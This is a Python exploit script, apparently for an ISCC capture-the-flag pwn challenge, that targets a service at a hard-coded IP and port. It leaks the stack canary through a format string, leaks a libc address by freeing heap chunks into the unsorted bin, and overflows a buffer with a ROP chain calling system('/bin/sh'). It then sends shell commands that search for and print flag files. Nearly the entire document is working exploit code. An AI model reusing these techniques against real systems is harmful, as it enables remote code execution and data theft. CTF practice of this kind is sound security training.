import re
import socket
import struct
import time


HOST = "39.96.193.120"
PORT = 10006

CANARY_FMT = b"%7$p"
UNSORTED_CANDIDATES = [
    0x1ECBE0,  # main_arena+0x60 for the bundled libc-2.31.so
    0x1EBBE0,  # fallback in case the remote libc layout differs by one page
]

LIBC_RET = 0x22679
LIBC_POP_RDI = 0x23B6A
LIBC_SYSTEM = 0x52290
LIBC_EXIT = 0x46A40
LIBC_BINSH = 0x1B45BD


def p64(x: int) -> bytes:
    if not (0 <= x <= 0xFFFFFFFFFFFFFFFF):
        raise ValueError(f"p64 out of range: {x} ({hex(x) if isinstance(x, int) else x})")
    return struct.pack("<Q", x)


def u64(x: bytes) -> int:
    return struct.unpack("<Q", x)[0]


class Tube:
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port), timeout=5)
        self.sock.settimeout(1.5)
        self.buf = b""

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass

    def send(self, data: bytes):
        self.sock.sendall(data)

    def sendline(self, data: bytes):
        self.send(data + b"\n")

    def recv_until(self, marker: bytes, timeout: float = 3.0) -> bytes:
        end = time.time() + timeout
        while marker not in self.buf:
            if time.time() > end:
                raise TimeoutError(f"timeout waiting for {marker!r}")
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                raise EOFError("connection closed")
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out = self.buf[:idx]
        self.buf = self.buf[idx:]
        return out

    def recv_some(self, duration: float = 1.0) -> bytes:
        end = time.time() + duration
        out = self.buf
        self.buf = b""
        while time.time() < end:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                break
            out += chunk
        return out


def parse_canary(blob: bytes) -> int:
    m = re.search(rb"Hello, (0x[0-9a-fA-F]+)", blob)
    if not m:
        raise ValueError("failed to parse canary leak")
    return int(m.group(1), 16)


def forge_ring(io: Tube, slot: int, ch: bytes = b"A"):
    io.sendline(b"2")
    io.recv_until(b"(0-9)")
    io.sendline(str(slot).encode())
    io.recv_until(b"location:")
    io.sendline(ch[:1])
    io.recv_until(b"(1-9):")
    io.sendline(b"1")
    io.recv_until(b"Press ENTER to return.")
    io.sendline(b"")
    io.recv_until(b">> ")


def discard_ring(io: Tube, slot: int):
    io.sendline(b"3")
    io.recv_until(b"discard?")
    io.sendline(str(slot).encode())
    io.recv_until(b">> ")


def leak_unsorted(io: Tube) -> int:
    # Keep one extra chunk allocated after slot 7 so freeing slot 7
    # cannot merge into the top chunk and instead lands in unsorted bin.
    for i in range(9):
        forge_ring(io, i, bytes([0x41 + i]))
    for i in range(8):
        discard_ring(io, i)

    io.sendline(b"1")
    data = io.recv_until(b"Press ENTER to return.")
    leak_line = None
    for line in data.split(b"\n"):
        if line.startswith(b"Ring Slot #7"):
            leak_line = line
            break
    if leak_line is None:
        raise ValueError("failed to find slot 7 leak line")
    leak_bytes = leak_line.rsplit(b"| ", 1)[1]
    leak = u64(leak_bytes[:6].ljust(8, b"\x00"))
    io.sendline(b"")
    io.recv_until(b">> ")
    return leak


def build_payload(canary: int, libc_base: int) -> bytes:
    chain = [
        libc_base + LIBC_RET,
        libc_base + LIBC_POP_RDI,
        libc_base + LIBC_BINSH,
        libc_base + LIBC_SYSTEM,
        libc_base + LIBC_EXIT,
    ]
    payload = b"A" * 0x38 + p64(canary) + b"B" * 8 + b"".join(p64(x) for x in chain)
    if b"\n" in payload:
        raise ValueError("payload contains newline, retry with a new process")
    return payload


def try_candidate(candidate: int) -> tuple[str | None, dict]:
    io = Tube(HOST, PORT)
    details = {"candidate": hex(candidate)}
    try:
        io.recv_until(b"What is your name?")
        io.sendline(CANARY_FMT)
        banner = io.recv_until(b">> ")
        canary = parse_canary(banner)
        details["canary"] = hex(canary)

        unsorted = leak_unsorted(io)
        libc_base = unsorted - candidate
        details["unsorted"] = hex(unsorted)
        details["libc_base"] = hex(libc_base)

        payload = build_payload(canary, libc_base)

        io.sendline(b"4")
        io.recv_until(b"id):")
        io.sendline(b"0")
        io.recv_until(b"spell:")
        io.send(payload + b"\n")
        time.sleep(0.3)

        cmd = (
            b"cat /flag 2>/dev/null; "
            b"cat /flag* 2>/dev/null; "
            b"cat /home/*/flag* 2>/dev/null; "
            b"cat /root/flag* 2>/dev/null; "
            b"find / -maxdepth 2 -name 'flag*' -type f 2>/dev/null | xargs cat 2>/dev/null; "
            b"echo END\n"
        )
        io.send(cmd)
        out = io.recv_some(3.0)
        details["tail"] = out
        m = re.search(rb"ISCC\{[^}]+\}", out)
        if m:
            return m.group(0).decode(), details
        return None, details
    finally:
        io.close()


def main():
    for attempt in range(1, 8):
        for candidate in UNSORTED_CANDIDATES:
            try:
                flag, details = try_candidate(candidate)
                print(f"[attempt {attempt}] candidate={details['candidate']} canary={details.get('canary')} unsorted={details.get('unsorted')} libc_base={details.get('libc_base')}")
                tail = details.get("tail", b"")
                if tail:
                    print(tail.decode("latin1", "replace"))
                if flag:
                    print(flag)
                    return
            except Exception as exc:
                print(f"[attempt {attempt}] candidate={hex(candidate)} failed: {exc}")
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
